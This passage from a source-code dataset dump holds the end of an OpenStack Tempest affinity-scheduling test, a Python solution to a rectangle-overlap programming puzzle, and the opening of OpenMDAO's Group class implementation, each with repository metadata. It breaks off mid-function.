  for server in servers:\n            self.delete_server(server['id'])\n\n    @decorators.idempotent_id('9d2e924a-baf4-11e7-b856-fa163e65f5ce')\n    @testtools.skipUnless(\n        compute.is_scheduler_filter_enabled(\"ServerGroupAffinityFilter\"),\n        'ServerGroupAffinityFilter is not available.')\n    def test_create_server_with_scheduler_hint_group_affinity(self):\n        \"\"\"Tests the ServerGroupAffinityFilter\n\n        Creates two servers in an affinity server group and\n        asserts the servers are in the group and on same host.\n        \"\"\"\n        hosts = self._create_servers_with_group('affinity')\n        hostnames = list(hosts.values())\n        self.assertEqual(hostnames[0], hostnames[1],\n                         'Servers are on the different hosts: %s' % hosts)\n        for server in servers:\n            self.delete_server(server['id'])\n"}
{"blob_id": "2b59b541df1303dbaeb0a549fb13cc19939a6605", "directory_id": "181dd3e0b79408b7a894539a850ddec1718af203", "path": "/\uc77c\ubc18/2527.py", "content_id": "666d445a904e99d59b5c60830bac984fca9fc12d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Winters0727/BOJ", "snapshot_id": "db39ef048fc8d73de1cf62b523a6006bbc9be31c", "revision_id": "ccf659d1b19e7d6a376c4419efe2631b7a6b33b4", "branch_name": "refs/heads/master", "visit_date": "2020-12-28 16:02:29.131369", "revision_date": "2020-04-10 19:23:50", "committer_date": "2020-04-10 19:23:50", "github_id": "238397823", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "764", "extension": "py", "content": "import sys\n\nsys.stdin = open('sample_input.txt')\n\ndef check(r_set, c_set):\n    if len(r_set) > 1 and len(c_set) > 1:\n        return 'a'\n    elif (len(r_set) > 1 and len(c_set) == 1) or (len(c_set) > 1 and len(r_set) == 1):\n        return 'b'\n    elif len(r_set) == 1 and len(c_set) == 1:\n        return 'c'\n    else:\n        return 'd'\n\nfor _ in range(4):\n    ar1, ac1, ar2, ac2, br1, bc1, br2, bc2 = map(int,input().split())\n    ar_set = set([num for num in range(ar1,ar2+1)])\n    ac_set = set([num for num in range(ac1,ac2+1)])\n    br_set = set([num for num in range(br1,br2+1)])\n    bc_set = set([num for num in range(bc1,bc2+1)])\n    r_set = ar_set.intersection(br_set)\n    c_set = ac_set.intersection(bc_set)\n    answer = check(r_set, c_set)\n    print(answer)"}
{"blob_id": "3870e674901b2f07f536899e5905e48d5b963f85", "directory_id": "4d200e1f225455c58e0dd89db587a29411f86245", "path": "/venv/Lib/site-packages/openmdao/core/group.py", "content_id": "5e9fbc962fc785cc475676ec6edad6f9c1f6af19", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ManojDjs/Heart-rate-estimation", "snapshot_id": "df0be78edbc70cc75c006c6f87c8169200de84e0", "revision_id": "d9e89fe017f1131d554599c248247f73bb9b534d", "branch_name": "refs/heads/main", "visit_date": "2023-05-09 10:58:37.614351", "revision_date": "2021-06-01 11:12:45", "committer_date": "2021-06-01 11:12:45", "github_id": "371493498", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "162316", "extension": "py", "content": "\"\"\"Define the Group class.\"\"\"\nimport os\nimport sys\nfrom collections import Counter, OrderedDict, defaultdict, deque\nfrom collections.abc import Iterable\n\nfrom itertools import product, chain\nfrom numbers import Number\nimport inspect\nfrom fnmatch import fnmatchcase\n\nimport numpy as np\nimport networkx as nx\n\nfrom openmdao.jacobians.dictionary_jacobian import DictionaryJacobian\nfrom openmdao.core.system import System\nfrom openmdao.core.component import Component, _DictValues\nfrom openmdao.vectors.vector import _full_slice\nfrom openmdao.core.constants import _UNDEFINED, INT_DTYPE\nfrom openmdao.proc_allocators.default_allocator import DefaultAllocator, ProcAllocationError\nfrom openmdao.jacobians.jacobian import SUBJAC_META_DEFAULTS\nfrom openmdao.recorders.recording_iteration_stack import Recording\nfrom openmdao.solvers.nonlinear.nonlinear_runonce import NonlinearRunOnce\nfrom openmdao.solvers.linear.linear_runonce import LinearRunOnce\nfrom openmdao.utils.array_utils import array_connection_compatible, _flatten_src_indices, \\\n    shape_to_len\nfrom openmdao.utils.general_utils import common_subpath, \\\n    conditional_error, _is_slicer_op, _slice_indices, convert_src_inds, \\\n    shape_from_idx, shape2tuple, get_connection_owner\nfrom openmdao.utils.units import is_compatible, unit_conversion, _has_val_mismatch, _find_unit, \\\n    _is_unitless, simplify_unit\nfrom openmdao.utils.mpi import MPI, check_mpi_exceptions, multi_proc_exception_check\nimport openmdao.utils.coloring as coloring_mod\nfrom openmdao.utils.array_utils import evenly_distrib_idxs\nfrom openmdao.warnings import issue_warning, UnitsWarning, UnusedOptionWarning, \\\n    SetupWarning, PromotionWarning, MPIWarning\nfrom openmdao.core.constants import _SetupStatus\nfrom openmdao.warnings import warn_deprecation\n\n# regex to check for valid names.\nimport re\nnamecheck_rgx = re.compile('[a-zA-Z][_a-zA-Z0-9]*')\n\n\n# use a class with slots instead of a namedtuple so that we can\n# change index after creation if needed.\nclass _SysInfo(object):\n\n    __slots__ = ['system', 'index']\n\n    def __init__(self, system, index):\n        self.system = system\n        self.index = index\n\n    def __iter__(self):\n        yield self.system\n        yield self.index\n\n\nclass _PromotesInfo(object):\n    __slots__ = ['src_indices', 'flat', 'src_shape', 'parent', 'prom']\n\n    def __init__(self, src_indices=None, flat=None, src_shape=None, parent=None, prom=None):\n        if not _is_slicer_op(src_indices) and src_indices is not None:\n            src_indices = np.asarray(src_indices)\n        self.src_indices = src_indices\n        self.flat = flat\n        self.src_shape = src_shape\n        self.parent = None  # pathname of promoting system\n        self.prom = None  # local promoted name of input\n\n    def __iter__(self):\n        yield self.src_indices\n        yield self.flat\n        yield self.src_shape\n\n    def __repr__(self):\n        return (f\"_PromotesInfo({self.src_indices}, {self.flat}, {self.src_shape}, \"\n                f\"{self.parent}, {self.prom})\")\n\n    def prom_path(self):\n        if self.parent is None or self.prom is None:\n            return ''\n        return '.'.join((self.parent, self.prom)) if self.parent else self.prom\n\n    def copy(self):\n        return _PromotesInfo(self.src_indices, self.flat, self.src_shape, self.parent, self.prom)\n\n    def convert_from(self, parent):\n        # return a new _PromotesInfo that converts our src_indices based on the parent\n        if parent.src_indices is None:\n            return self.copy()\n        elif self.src_indices is None:\n            return parent.copy()\n\n        src_inds = convert_src_inds(parent.src_indices, parent.src_shape,\n                                    self.src_indices, self.src_shape)\n        return _PromotesInfo(src_inds, self.flat, self.src_shape, self.parent, self.prom)\n\n    def compare(self, other):\n        \"\"\"\n        Compare attributes in the two objects.\n\n        Two attributes are considered mismatched only if neither is None and their values\n        are unequal.\n\n        Returns\n        -------\n        list\n            List of unequal atrribute names.\n        \"\"\"\n        mismatches = []\n\n        if self.flat != other.flat:\n            if self.flat is not None and other.flat is not None:\n                mismatches.append('flat_src_indices')\n\n        if self.src_shape != other.src_shape:\n            if self.src_shape is not None and other.src_shape is not None:\n                mismatches.append('src_shape')\n\n        if isinstance(self.src_indices, np.ndarray) and isinstance(other.src_indices, np.ndarray):\n            if (self.src_indices.shape != other.src_indices.shape or\n                    not np.all(self.src_indices == other.src_indices)):\n                mismatches.append('src_indices')\n        elif not (self.src_indices is None or other.src_indices is None):\n            if self.src_indices != other.src_indices:\n                mismatches.append('src_indices')\n\n        return mismatches\n\n\nclass Group(System):\n    \"\"\"\n    Class used to group systems together; instantiate or inherit.\n\n    Attributes\n    ----------\n    _mpi_proc_allocator : ProcAllocator\n        Object used to allocate MPI processes to subsystems.\n    _proc_info : dict of subsys_name: (min_procs, max_procs, weight)\n        Information used to determine MPI process allocation to subsystems.\n    _subgroups_myproc : list\n        List of local subgroups.\n    _manual_connections : dict\n        Dictionary of input_name: (output_name, src_indices) connections.\n    _group_inputs : dict\n        Mapping of promoted names to certain metadata (src_indices, units).\n    _static_group_inputs : dict\n        Group inputs added outside of setup/configure.\n    _pre_config_group_inputs : dict\n        Group inputs added inside of setup but before configure.\n    _static_manual_connections : dict\n        Dictionary that stores all explicit connections added outside of setup.\n    _conn_abs_in2out : {'abs_in': 'abs_out'}\n        Dictionary containing all explicit & implicit continuous var connections owned\n        by this system only. The data is the same across all processors.\n    _conn_discrete_in2out : {'abs_in': 'abs_out'}\n        Dictionary containing all explicit & implicit discrete var connections owned\n        by this system only. The data is the same across all processors.\n    _transfers : dict of dict of dict of Transfers\n        First key is the vec_name, second key is mode, third is subname where\n        mode is 'fwd' or 'rev' and subname is the subsystem name\n        or subname can be None for the full, simultaneous transfer.\n    _discrete_transfers : dict of discrete transfer metadata\n        Key is system pathname or None for the full, simultaneous transfer.\n    _setup_procs_finished : bool\n        Flag to check if setup_procs is complete\n    _contains_parallel_group : bool\n        If True, this Group contains a ParallelGroup. Only used to determine if a parallel\n        group or distributed component is below a DirectSolver so that we can raise an exception.\n    _raise_connection_errors : bool\n        Flag indicating whether connection errors are raised as an Exception.\n    _order_set : bool\n        Flag to check if set_order has been called.\n    _auto_ivc_warnings : list\n        List of Auto IVC warnings to be raised later with simple_warnings.\n    _shapes_graph : nx.OrderedGraph\n        Dynamic shape dependency graph, or None.\n    _shape_knowns : set\n        Set of shape dependency graph nodes with known (non-dynamic) shapes.\n    \"\"\"\n\n    def __init__(self, **kwargs):\n        \"\"\"\n        Set the solvers to nonlinear and linear block Gauss--Seidel by default.\n\n        Parameters\n        ----------\n        **kwargs : dict\n            dict of arguments available here and in all descendants of this\n            Group.\n        \"\"\"\n        self._mpi_proc_allocator = DefaultAllocator()\n        self._proc_info = {}\n\n        super().__init__(**kwargs)\n\n        self._subgroups_myproc = None\n        self._manual_connections = {}\n        self._group_inputs = {}\n        self._pre_config_group_inputs = {}\n        self._static_group_inputs = {}\n        self._static_manual_connections = {}\n        self._conn_abs_in2out = {}\n        self._conn_discrete_in2out = {}\n        self._transfers = {}\n        self._discrete_transfers = {}\n        self._setup_procs_finished = False\n        self._contains_parallel_group = False\n        self._raise_connection_errors = True\n        self._order_set = False\n        self._shapes_graph = None\n        self._shape_knowns = None\n\n        # TODO: we cannot set the solvers with property setters at the moment\n        # because our lint check thinks that we are defining new attributes\n        # called nonlinear_solver and linear_solver without documenting them.\n        if not self._nonlinear_solver:\n            self._nonlinear_solver = NonlinearRunOnce()\n        if not self._linear_solver:\n            self._linear_solver = LinearRunOnce()\n\n    def setup(self):\n        \"\"\"\n        Build this group.\n\n        This method should be overidden by your Group's method. The reason for using this\n        method to add subsystem is to save memory and setup time when using your Group\n        while running under MPI.  This avoids the creation of systems that will not be\n        used in the current process.\n\n        You may call 'add_subsystem' to add systems to this group. You may also issue connections,\n        and set the linear and nonlinear solvers for this group level. You cannot safely change\n        anything on children systems; use the 'configure' method instead.\n\n        Available attributes:\n            name\n            pathname\n            comm\n            options\n        \"\"\"\n        pass\n\n    def configure(self):\n        \"\"\"\n        Configure this group to assign children settings.\n\n        This method may optionally be overidden by your Group's method.\n\n        You may only use this method to change settings on your children subsystems. This includes\n        setting solvers in cases where you want to override the defaults.\n\n        You can assume that the full hierarchy below your level has been instantiated and has\n        already called its own configure methods.\n\n        Available attributes:\n            name\n            pathname\n            comm\n            options\n            system hieararchy with attribute access\n        \"\"\"\n        pass\n\n    def set_input_defaults(self, name, val=_UNDEFINED, units=None, src_shape=None):\n        \"\"\"\n        Specify metadata to be assumed when multiple inputs are promoted to the same name.\n\n        Parameters\n        ----------\n        name : str\n            Promoted input name.\n        val : object\n            Value to assume for the promoted input.\n        units : str or None\n            Units to assume for the promoted input.\n        src_shape : int or tuple\n            Assumed shape of any connected source or higher level promoted input.\n        \"\"\"\n        meta = {'prom': name, 'auto': False}\n        if val is _UNDEFINED:\n            src_shape = shape2tuple(src_shape)\n        else:\n            meta['value'] = val\n            if src_shape is not None:\n                issue_warning(\"value was set in set_input_defaults, so ignoring \"\n                              f\"value {src_shape} of src_shape.\", prefix=self.msginfo,\n                              category=PromotionWarning)\n            if isinstance(val, np.ndarray):\n                src_shape = val.shape\n            elif isinstance(val, Number):\n                src_shape = (1,)\n        if units is not None:\n            if not isinstance(units, str):\n                raise TypeError('%s: The units argument should be a str or None' % self.msginfo)\n            meta['units'] = simplify_unit(units, msginfo=self.msginfo)\n\n        if src_shape is not None:\n            meta['src_shape'] = src_shape\n\n        if self._static_mode:\n            dct = self._static_group_inputs\n        else:\n            dct = self._group_inputs\n\n        if name in dct:\n            old = dct[name][0]\n            overlap = sorted(set(old).intersection(meta))\n            if overlap:\n                issue_warning(f\"Setting input defaults for input '{name}' which \"\n                              f\"override previously set defaults for {overlap}.\",\n                              prefix=self.msginfo, condition=PromotionWarning)\n            old.update(meta)\n        else:\n            dct[name] = [meta]\n\n    def _get_scope(self, excl_sub=None):\n        \"\"\"\n        Find the input and output variables that are needed for a particular matvec product.\n\n        Parameters\n        ----------\n        excl_sub : <System>\n            A subsystem whose variables should be excluded from the matvec product.\n\n        Returns\n        -------\n        (set, set)\n            Sets of output and input variables.\n        \"\"\"\n        if excl_sub is None:\n            cache_key = None\n        else:\n            cache_key = excl_sub.pathname\n\n        try:\n            io_vars = self._scope_cache[cache_key]\n\n            # Make sure they're the same subsystem instance before returning\n            if io_vars[2] is excl_sub:\n                return (io_vars[:2])\n        except KeyError:\n            pass\n\n        if excl_sub is None:\n            # All outputs\n            scope_out = frozenset(self._var_allprocs_abs2meta['output'])\n\n            # All inputs connected to an output in this system\n            scope_in = frozenset(self._conn_global_abs_in2out).intersection(\n                self._var_allprocs_abs2meta['input'])\n\n        else:\n            # Empty for the excl_sub\n            scope_out = frozenset()\n\n            # All inputs connected to an output in this system but not in excl_sub\n            scope_in = set()\n            for abs_in in self._var_allprocs_abs2meta['input']:\n                if abs_in in self._conn_global_abs_in2out:\n                    abs_out = self._conn_global_abs_in2out[abs_in]\n\n                    if abs_out not in excl_sub._var_allprocs_abs2idx['linear']:\n                        scope_in.add(abs_in)\n            scope_in = frozenset(scope_in)\n\n        # Use the pathname as the dict key instead of the object itself. When\n        # the object is used as the key, memory leaks result from multiple\n        # calls to setup().\n        self._scope_cache[cache_key] = (scope_out, scope_in, excl_sub)\n        return scope_out, scope_in\n\n    def _compute_root_scale_factors(self):\n        \"\"\"\n        Compute scale factors for all variables.\n\n        Returns\n        -------\n        dict\n            Mapping of each absolute var name to its corresponding scaling factor tuple.\n        \"\"\"\n        # The output and residual vectors are handled in system.py.\n        scale_factors = super()._compute_root_scale_factors()\n\n        # Input scaling for connected inputs is added here.\n        # This is a combined scale factor that includes the scaling of the connected source\n        # and the unit conversion between the source output and each target input.\n        if self._has_input_scaling:\n            abs2meta_in = self._var_abs2meta['input']\n            allprocs_meta_out = self._var_allprocs_abs2meta['output']\n            for abs_in, abs_out in self._conn_global_abs_in2out.items():\n                if abs_in not in abs2meta_in:\n                    # we only perform scaling on local, non-discrete arrays, so skip\n                    continue\n\n                meta_in = abs2meta_in[abs_in]\n\n                meta_out = allprocs_meta_out[abs_out]\n                ref = meta_out['ref']\n                ref0 = meta_out['ref0']\n\n                src_indices = meta_in['src_indices']\n\n                if src_indices is not None:\n                    if not (np.isscalar(ref) and np.isscalar(ref0)):\n                        # TODO: if either ref or ref0 are not scalar and the output is\n                        # distributed, we need to do a scatter\n                        # to obtain the values needed due to global src_indices\n                        if meta_out['distributed']:\n                            raise RuntimeError(\"{}: vector scalers with distrib vars \"\n                                               \"not supported yet.\".format(self.msginfo))\n\n                        if src_indices.ndim != 1:\n                            src_indices = _flatten_src_indices(src_indices, meta_in['shape'],\n                                                               meta_out['global_shape'],\n                                                               meta_out['global_size'])\n\n                        ref = ref[src_indices]\n                        ref0 = ref0[src_indices]\n\n                # Compute scaling arrays for inputs using a0 and a1\n                # Example:\n                #   Let x, x_src, x_tgt be the dimensionless variable,\n                #   variable in source units, and variable in target units, resp.\n                #   x_src = a0 + a1 x\n                #   x_tgt = b0 + b1 x\n                #   x_tgt = g(x_src) = d0 + d1 x_src\n                #   b0 + b1 x = d0 + d1 a0 + d1 a1 x\n                #   b0 = d0 + d1 a0\n                #   b0 = g(a0)\n                #   b1 = d0 + d1 a1 - d0\n                #   b1 = g(a1) - g(0)\n\n                units_in = meta_in['units']\n                units_out = meta_out['units']\n\n                if units_in is None or units_out is None or units_in == units_out:\n                    a0 = ref0\n                    a1 = ref - ref0\n                else:\n                    factor, offset = unit_conversion(units_out, units_in)\n                    a0 = (ref0 + offset) * factor\n                    a1 = (ref - ref0) * factor\n\n                scale_factors[abs_in] = {\n                    'input': (a0, a1),\n                }\n\n                # Check whether we need to allocate an adder for the input vector.\n                if np.any(np.asarray(a0)):\n                    self._has_input_adder = True\n\n        return scale_factors\n\n    def _configure(self):\n        \"\"\"\n        Configure our model recursively to assign any children settings.\n\n        Highest system's settings take precedence.\n        \"\"\"\n        # reset group_inputs back to what it was just after self.setup() in case _configure\n        # is called multiple times.\n        self._group_inputs = self._pre_config_group_inputs.copy()\n        for n, lst in self._group_inputs.items():\n            self._group_inputs[n] = lst.copy()\n\n        for subsys in self._subsystems_myproc:\n            subsys._configure()\n            subsys._setup_var_data()\n\n            self._has_guess |= subsys._has_guess\n            self._has_bounds |= subsys._has_bounds\n            self.matrix_free |= subsys.matrix_free\n\n        conf_info = self._problem_meta['config_info']\n        conf_info._reset()\n\n        self._problem_meta['setup_status'] = _SetupStatus.POST_CONFIGURE\n        self.configure()\n\n        # if our configure() has added or promoted any variables, we have to call\n        # _setup_var_data again on any modified systems and their ancestors (only those that\n        # are our descendents).\n        for s in conf_info._modified_system_iter(self):\n            s._setup_var_data()\n\n    def _setup_procs(self, pathname, comm, mode, prob_meta):\n        \"\"\"\n        Execute first phase of the setup process.\n\n        Distribute processors, assign pathnames, and call setup on the group. This method recurses\n        downward through the model.\n\n        Parameters\n        ----------\n        pathname : str\n            Global name of the system, including the path.\n        comm : MPI.Comm or <FakeComm>\n            MPI communicator object.\n        mode : string\n            Derivatives calculation mode, 'fwd' for forward, and 'rev' for\n            reverse (adjoint). Default is 'rev'.\n        prob_meta : dict\n            Problem level metadata.\n        \"\"\"\n        super()._setup_procs(pathname, comm, mode, prob_meta)\n        self._setup_procs_finished = False\n\n        nproc = comm.size\n\n        if self._num_par_fd > 1:\n            info = self._coloring_info\n            if comm.size > 1:\n                # if approx_totals has been declared, or there is an approx coloring, setup par FD\n                if self._owns_approx_jac or info['dynamic'] or info['static'] is not None:\n                    comm = self._setup_par_fd_procs(comm)\n                else:\n                    msg = \"%s: num_par_fd = %d but FD is not active.\" % (self.msginfo,\n                                                                         self._num_par_fd)\n                    raise RuntimeError(msg)\n            elif not MPI:\n                msg = f\"MPI is not active but num_par_fd = {self._num_par_fd}. No parallel \" \\\n                      f\"finite difference will be performed.\"\n                issue_warning(msg, prefix=self.msginfo, category=MPIWarning)\n\n        self.comm = comm\n\n        self._subsystems_allprocs = self._static_subsystems_allprocs.copy()\n        self._manual_connections = self._static_manual_connections.copy()\n        self._group_inputs = self._static_group_inputs.copy()\n        # copy doesn't copy the internal list so we have to do it manually (we don't want\n        # a full deepcopy either because we want the internal metadata dicts to be shared)\n        for n, lst in self._group_inputs.items():\n            self._group_inputs[n] = lst.copy()\n\n        # Call setup function for this group.\n        self.setup()\n        self._setup_check()\n\n        # need to save these because _setup_var_data can be called multiple times\n        # during the config process and we don't want to wipe out any group_inputs\n        # that were added during self.setup()\n        self._pre_config_group_inputs = self._group_inputs.copy()\n        for n, lst in self._pre_config_group_inputs.items():\n            self._pre_config_group_inputs[n] = lst.copy()\n\n        if MPI:\n\n            allsubs = list(self._subsystems_allprocs.values())\n            proc_info = [self._proc_info[s.name] for s, _ in allsubs]\n\n            # Call the load balancing algorithm\n            try:\n                sub_inds, sub_comm, sub_proc_range = self._mpi_proc_allocator(\n                    proc_info, len(allsubs), comm)\n            except ProcAllocationError as err:\n                if err.sub_inds is None:\n                    raise RuntimeError(\"%s: %s\" % (self.msginfo, err.msg))\n                else:\n                    raise RuntimeError(\"%s: MPI process allocation failed: %s for the following \"\n                                       \"subsystems: %s\" %\n                                       (self.msginfo, err.msg,\n                                        [allsubs[i].system.name for i in err.sub_inds]))\n\n            self._subsystems_myproc = [allsubs[ind].system for ind in sub_inds]\n\n            # Define local subsystems\n            if not (np.sum([minp for minp, _, _ in proc_info]) <= comm.size):\n                # reorder the subsystems_allprocs based on which procs they live on. If we don't\n                # do this, we can get ordering mismatches in some of our data structures.\n                new_allsubs = OrderedDict()\n                seen = set()\n                gathered = self.comm.allgather(sub_inds)\n                for rank, inds in enumerate(gathered):\n                    for ind in inds:\n                        if ind not in seen:\n                            sinfo = allsubs[ind]\n                            sinfo.index = len(new_allsubs)\n                            new_allsubs[sinfo.system.name] = sinfo\n                            seen.add(ind)\n                self._subsystems_allprocs = new_allsubs\n        else:\n            sub_comm = comm\n            self._subsystems_myproc = [s for s, _ in self._subsystems_allprocs.values()]\n\n        # need to set pathname correctly even for non-local subsystems\n        for s, _ in self._subsystems_allprocs.values():\n            s.pathname = '.'.join((self.pathname, s.name)) if self.pathname else s.name\n\n        # Perform recursion\n        allsubs = self._subsystems_allprocs\n        for subsys in self._subsystems_myproc:\n            subsys._setup_procs(subsys.pathname, sub_comm, mode, prob_meta)\n\n        # build a list of local subgroups to speed up later loops\n        self._subgroups_myproc = [s for s in self._subsystems_myproc if isinstance(s, Group)]\n\n        if MPI and nproc > 1:\n            if self._mpi_proc_allocator.parallel:\n                self._problem_meta['parallel_groups'].append(self.pathname)\n\n            allpars = self.comm.allgather(self._problem_meta['parallel_groups'])\n            full = set()\n            for p in allpars:\n                full.update(p)\n            self._problem_meta['parallel_groups'] = sorted(full)\n\n        if self._problem_meta['parallel_groups']:\n            prefix = self.pathname + '.' if self.pathname else ''\n            for par in self._problem_meta['parallel_groups']:\n                if par.startswith(prefix) and par != prefix:\n                    self._contains_parallel_group = True\n                    break\n\n        self._setup_procs_finished = True\n\n    def _configure_check(self):\n        \"\"\"\n        Do any error checking on i/o and connections.\n        \"\"\"\n        for subsys in self._subsystems_myproc:\n            subsys._configure_check()\n\n        super()._configure_check()\n\n    def _list_states(self):\n        \"\"\"\n        Return list of all local states at and below this system.\n\n        Returns\n        -------\n        list\n            List of all states.\n        \"\"\"\n        states = []\n        for subsys in self._subsystems_myproc:\n            states.extend(subsys._list_states())\n\n        return sorted(states)\n\n    def _list_states_allprocs(self):\n        \"\"\"\n        Return list of all states at and below this system across all procs.\n\n        Returns\n        -------\n        list\n            List of all states.\n        \"\"\"\n        if MPI:\n            all_states = set()\n            byproc = self.comm.allgather(self._list_states())\n            for proc_states in byproc:\n                all_states.update(proc_states)\n            return sorted(all_states)\n        else:\n            return self._list_states()\n\n    def _get_all_promotes(self):\n        \"\"\"\n        Create the top level mapping of all promoted names to absolute names for all local systems.\n\n        This includes all buried promoted names.\n\n        Returns\n        -------\n        dict\n            Mapping of all promoted names to absolute names.\n        \"\"\"\n        iotypes = ('input', 'output')\n        if self.comm.size > 1:\n            prom2abs = {'input': defaultdict(set), 'output': defaultdict(set)}\n            rem_prom2abs = {'input': defaultdict(set), 'output': defaultdict(set)}\n            myrank = self.comm.rank\n            vars_to_gather = self._vars_to_gather\n\n            for s in self.system_iter(recurse=True):\n                prefix = s.pathname + '.' if s.pathname else ''\n                for typ in iotypes:\n                    # use abs2prom to determine locality since prom2abs is for allprocs\n                    sys_abs2prom = s._var_abs2prom[typ]\n                    t_remprom2abs = rem_prom2abs[typ]\n                    t_prom2abs = prom2abs[typ]\n                    for prom, alist in s._var_allprocs_prom2abs_list[typ].items():\n                        abs_names = [n for n in alist if n in sys_abs2prom]\n                        t_prom2abs[prefix + prom].update(abs_names)\n                        t_remprom2abs[prefix + prom].update(n for n in abs_names\n                                                            if n in vars_to_gather\n                                                            and vars_to_gather[n] == myrank)\n\n            all_proms = self.comm.gather(rem_prom2abs, root=0)\n            if myrank == 0:\n                for typ in iotypes:\n                    t_prom2abs = prom2abs[typ]\n                    for rankproms in all_proms:\n                        for prom, absnames in rankproms[typ].items():\n                            t_prom2abs[prom].update(absnames)\n\n                    for prom, absnames in t_prom2abs.items():\n                        t_prom2abs[prom] = sorted(absnames)  # sort to keep order same on all procs\n\n                self.comm.bcast(prom2abs, root=0)\n            else:\n                prom2abs = self.comm.bcast(None, root=0)\n        else:  # serial\n            prom2abs = {'input': defaultdict(list), 'output': defaultdict(list)}\n            for s in self.system_iter(recurse=True):\n                prefix = s.pathname + '.' if s.pathname else ''\n                for typ in iotypes:\n                    t_prom2abs = prom2abs[typ]\n                    for prom, abslist in s._var_allprocs_prom2abs_list[typ].items():\n                        t_prom2abs[prefix + prom] = abslist\n\n        return prom2abs\n\n    def _top_level_post_connections(self, mode):\n        # this is called on the top level group after all connections are known\n        self._problem_meta['vars_to_gather'] = self._vars_to_gather\n        self._problem_meta['prom2abs'] = self._get_all_promotes()\n\n        self._resolve_group_input_defaults()\n        self._setup_auto_ivcs(mode)\n        self._check_prom_masking()\n\n    def _check_prom_masking(self):\n        \"\"\"\n        Raise exception if any promoted variable name masks an absolute variable name.\n\n        Only called on the top level group.\n        \"\"\"\n        prom2abs_in = self._var_allprocs_prom2abs_list['input']\n        prom2abs_out = self._var_allprocs_prom2abs_list['output']\n        abs2meta = self._var_allprocs_abs2meta\n\n        for io in ('input', 'output'):\n            for absname in abs2meta[io]:\n                if absname in prom2abs_in:\n                    for name in prom2abs_in[absname]:\n                        if name != absname:\n                            raise RuntimeError(f\"{self.msginfo}: Absolute variable name '{absname}'\"\n                                               \" is masked by a matching promoted name. Try\"\n                                               \" promoting to a different name. This can be caused\"\n                                               \" by promoting '*' at group level or promoting using\"\n                                               \" dotted names.\")\n                elif absname in prom2abs_out:\n                    if absname != prom2abs_out[absname][0]:\n                        raise RuntimeError(f\"{self.msginfo}: Absolute variable name '{absname}' is\"\n                                           \" masked by a matching promoted name. Try\"\n                                           \" promoting to a different name. This can be caused\"\n                                           \" by promoting '*' at group level or promoting using\"\n                                           \" dotted names.\")\n\n    def _top_level_post_sizes(self):\n        # this runs after the variable sizes are known\n        self._setup_global_shapes()\n\n        self._resolve_ambiguous_input_meta()\n\n        all_abs2meta_out = self._var_allprocs_abs2meta['output']\n        if self.comm.size > 1:\n            abs2idx = self._var_allprocs_abs2idx['nonlinear']\n            all_abs2meta = self._var_allprocs_abs2meta\n            all_abs2meta_in = all_abs2meta['input']\n            conns = self._conn_global_abs_in2out\n\n            # the code below is to handle the case where src_indices were not specified\n            # for a distributed input or an input connected to a distributed auto_ivc\n            # output. This update can't happen until sizes are known.\n            dist_ins = (n for n, m in all_abs2meta_in.items() if m['distributed'] or\n                        (conns[n].startswith('_auto_ivc.') and\n                         all_abs2meta_out[conns[n]]['distributed']))\n            dcomp_names = set(d.rsplit('.', 1)[0] for d in dist_ins)\n            if dcomp_names:\n                added_src_inds = []\n                for comp in self.system_iter(recurse=True, typ=Component):\n                    if comp.pathname in dcomp_names:\n                        added_src_inds.extend(\n                            comp._update_dist_src_indices(conns, all_abs2meta, abs2idx,\n                                                          self._var_sizes))\n\n                updated = set()\n                for alist in self.comm.allgather(added_src_inds):\n                    updated.update(alist)\n\n                for a in updated:\n                    all_abs2meta_in[a]['has_src_indices'] = True\n\n        self._resolve_src_indices()\n\n        if self.comm.size > 1:\n            allprocs_abs2meta_in = self._var_allprocs_abs2meta['input']\n            allprocs_abs2meta_out = self._var_allprocs_abs2meta['output']\n            abs2meta_in = self._var_abs2meta['input']\n            for abs_in, abs_out in sorted(conns.items()):\n                if abs_out not in allprocs_abs2meta_out:\n                    continue  # discrete var\n                all_meta_out = allprocs_abs2meta_out[abs_out]\n                all_meta_in = allprocs_abs2meta_in[abs_in]\n                in_dist = all_meta_in['distributed']\n                out_dist = all_meta_out['distributed']\n\n                # check that src_indices match for dist->serial connection\n                # FIXME: this transfers src_indices from all ranks to rank 0 so we could run into\n                # memory issues if src_indices are large.  Maybe try something like computing a hash\n                # in each rank and comparing those?\n                if out_dist and not in_dist:\n                    # all serial inputs must have src_indices if they connect to a distributed\n                    # output\n                    owner = self._owning_rank[abs_in]\n                    if abs_in in abs2meta_in:  # input is local\n                        src_inds = abs2meta_in[abs_in]['src_indices']\n                    else:\n                        src_inds = None\n                    if self.comm.rank == owner:\n                        baseline = None\n                        err = 0\n                        for sinds in self.comm.gather(src_inds, root=owner):\n                            if sinds is not None:\n                                if baseline is None:\n                                    baseline = sinds\n                                else:\n                                    if not np.all(sinds == baseline):\n                                        err = 1\n                                        break\n                        if baseline is None:  # no src_indices were set\n                            err = -1\n                        self.comm.bcast(err, root=owner)\n                    else:\n                        self.comm.gather(src_inds, root=owner)\n                        err = self.comm.bcast(None, root=owner)\n                    if err == 1:\n                        raise RuntimeError(f\"{self.msginfo}: Can't connect distributed output \"\n                                           f\"'{abs_out}' to serial input '{abs_in}' because \"\n                                           \"src_indices differ on different ranks.\")\n                    elif err == -1:\n                        raise RuntimeError(f\"{self.msginfo}: Can't connect distributed output \"\n                                           f\"'{abs_out}' to serial input '{abs_in}' without \"\n                                           \"specifying src_indices.\")\n                elif in_dist and not out_dist:\n                    warn_deprecation(f\"Connection between serial output '{abs_out}' and distributed\"\n                                     f\" input '{abs_in}' is deprecated and will become an error \"\n                                     \"in a future release.\")\n\n    def _get_group_input_meta(self, prom_in, meta_name):\n        if prom_in in self._group_inputs:\n            meta = self._group_inputs[prom_in][0]\n            if meta_name in meta:\n                return meta[meta_name]\n\n    def _get_promotes_call_info(self, abs_in):\n        prefix_len = len(self.pathname) + 1 if self.pathname else 0\n        subname = abs_in[prefix_len:].split('.', 1)[0]\n        sub, _ = self._subsystems_allprocs[subname]\n        subprom = sub._var_allprocs_abs2prom['input'][abs_in]\n        if 